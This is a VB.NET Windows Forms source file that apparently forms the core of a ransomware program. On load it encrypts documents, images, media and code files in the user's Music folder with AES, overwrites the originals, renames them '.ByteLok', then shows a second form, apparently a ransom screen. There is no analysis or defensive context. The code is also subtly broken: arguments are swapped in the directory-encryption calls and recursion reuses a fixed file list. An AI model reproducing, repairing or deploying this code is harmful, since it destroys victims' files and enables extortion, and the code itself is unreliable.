Imports System.IO
Imports System.Security.Cryptography
Imports System.Text

Public Class Form2


    Private userName As String = Environment.UserName
    Private computerName As String = Environment.MachineName.ToString()
    Private Input As String = userName & computerName
    Private userDir As String = Environment.GetFolderPath(Environment.SpecialFolder.MyMusic)

    Private ReadOnly files As String() = Directory.GetFiles(userDir)
    Private ReadOnly childDirectories As String() = Directory.GetDirectories(userDir)

    Private Sub Form2_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        EncryptDirectory(userDir, True)
        Timer1.Start()
    End Sub


    Public Function AES_Encrypt(bytesToBeEncrypted As Byte(), passwordBytes As Byte()) As Byte()
        Dim encryptedBytes As Byte() = Nothing
        Dim saltBytes As Byte() = New Byte() {1, 2, 3, 4, 5, 6, 7, 8}

        Using ms As New MemoryStream()

            Using AES As New RijndaelManaged()
                AES.KeySize = 256
                AES.BlockSize = 128
                Dim key = New Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000)
                AES.Key = key.GetBytes(AES.KeySize / 8)
                AES.IV = key.GetBytes(AES.BlockSize / 8)
                AES.Mode = CipherMode.CBC

                Using cs = New CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write)
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length)
                    cs.Close()
                End Using

                encryptedBytes = ms.ToArray()
            End Using
        End Using

        Return encryptedBytes
    End Function

    Public Function CreatePassword(length As Integer) As String
        Const valid As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"
        Dim res As New StringBuilder()
        Dim rnd As New Random()

        While 0 < Math.Max(Threading.Interlocked.Decrement(length), length + 1)
            res.Append(valid(rnd.[Next](valid.Length)))
        End While

        Return res.ToString()
    End Function

    Public Sub EncryptFile(file As String, password As String)
        Dim bytesToBeEncrypted As Byte() = IO.File.ReadAllBytes(file)
        Dim passwordBytes As Byte() = Encoding.UTF8.GetBytes(password)
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes)
        Dim bytesEncrypted As Byte() = AES_Encrypt(bytesToBeEncrypted, passwordBytes)
        IO.File.WriteAllBytes(file, bytesEncrypted)
        IO.File.Move(file, file & ".ByteLok")
    End Sub

    Public Sub EncryptDirectory(password As String, location As String)

        Dim validExtensions = {".txt", ".mp4", ".mp3", ".crx", ".xls", ".xlsx", ".bin", ".jpeg", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".odt", "ods", ".jpg", ".png", ".csv", ".sql", ".mdb", ".sln", ".php", ".asp", ".aspx", ".html", ".xml", ".psd", ".pdf"}
        Try


            For i As Integer = 0 To files.Length - 1
                Dim extension As String = Path.GetExtension(files(i))

                If validExtensions.Contains(extension) Then
                    EncryptFile(files(i), password)
                End If
            Next

            For i As Integer = 0 To childDirectories.Length - 1
                EncryptDirectory(childDirectories(i), password)
            Next


        Catch __unusedSystemException1__ As SystemException
            Debug.WriteLine(__unusedSystemException1__)
        End Try

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Form3.Show()
        Hide()
    End Sub
End Class